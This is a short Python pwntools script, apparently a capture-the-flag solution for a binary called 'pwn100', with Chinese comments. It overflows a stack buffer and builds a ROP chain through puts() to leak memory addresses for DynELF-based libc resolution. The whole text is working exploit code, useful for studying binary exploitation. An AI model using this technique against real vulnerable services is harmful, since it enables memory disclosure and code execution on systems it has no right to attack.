from pwn import *
 
io = process("./pwn100")
elf = ELF("./pwn100")
 
 
puts_addr = elf.plt['puts']
pop_rdi = 0x400763
start_addr = 0x400550
 
def leak(addr):
       count = 0
       up = ''
       content = ''
       payload = 'A'*72                        #padding
       payload += p64(pop_rdi)                  #给puts()赋值
       payload += p64(addr)               #leak函数的参数addr
       payload += p64(puts_addr)        #调用puts()函数
       payload += p64(start_addr)       #跳转到start，恢复栈
       payload = payload.ljust(200, 'B') #padding
       io.send(payload)
       io.recvuntil("bye~\n")
       while True:                                                      #无限循环读取，防止recv()读取输出不全
              c = io.recv(numb=1, timeout=0.1)     #每次读取一个字节，设置超时时间确保没有遗漏
              count += 1                                            
              if up == '\n' and c == "":                  #上一个字符是回车且读不到其他字符，说明读完了
                     content = content[:-1]+'\x00'    #最后一个字符置为\x00
                     break
              else:
                     content += c #拼接输出
                     up = c    #保存最后一个字符
       content = content[:4]   #截取输出的一段作为返回值，提供给DynELF处理
       log.info("%#x => %s" % (addr, (content or '').encode('hex')))
       return content
	   
leak(puts_addr)